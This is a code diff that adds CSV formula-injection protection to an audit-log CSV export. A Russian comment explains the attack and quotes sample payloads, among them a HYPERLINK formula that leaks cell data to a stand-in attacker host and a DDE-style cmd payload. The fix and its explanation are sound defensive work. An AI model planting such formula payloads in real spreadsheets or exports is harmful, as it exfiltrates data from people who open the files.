@@ -21,9 +21,23 @@ export const dynamic = "force-dynamic";
  * Default: последние 90 дней если from/to не указаны.
  */
 
+// CSV-injection / formula-injection (CWE-1236):
+// Excel/LibreOffice выполняют ячейки начинающиеся с `=`, `+`, `-`, `@`,
+// табуляции или CR как формулы. AuditLog.userName / details могут
+// содержать пользовательские строки — атакующий с правом писать
+// audit-event'ы (например через подсадку в свой own name) внедряет
+// `=HYPERLINK("https://attacker/?leak="&A1, "click")` или прямой
+// `=cmd|...!A1`, и админ при открытии CSV в Excel получит исполнение.
+// Префиксим такие значения одинарной кавычкой — Excel показывает
+// видимое значение, но интерпретирует как текст.
+const FORMULA_PREFIX = /^[=+\-@\t\r]/;
+
 function csvEscape(value: string | number | null | undefined): string {
   if (value === null || value === undefined) return "";
-  const str = String(value);
+  let str = String(value);
+  if (FORMULA_PREFIX.test(str)) {
+    str = "'" + str;
+  }
   if (/[";\n]/.test(str)) {
     return `"${str.replace(/"/g, '""')}"`;
   }
